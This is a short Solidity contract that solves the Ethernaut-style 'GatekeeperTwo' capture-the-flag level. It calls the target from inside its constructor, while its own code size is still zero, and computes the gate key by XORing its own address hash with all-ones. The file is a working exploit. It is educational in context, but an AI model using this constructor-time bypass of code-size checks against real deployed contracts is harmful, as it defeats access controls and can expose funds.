pragma solidity ^0.6.0;
import "./14-GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo public gatekeeperTwoContract;

    constructor(address gatekeeperTwoContractAddress) public {
        gatekeeperTwoContract = GatekeeperTwo(gatekeeperTwoContractAddress);
        // while the contract is being constructed the code size is actually zero
        // hence all the code is in the constructor
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        gatekeeperTwoContract.enter(bytes8(gateKey));
    }
}
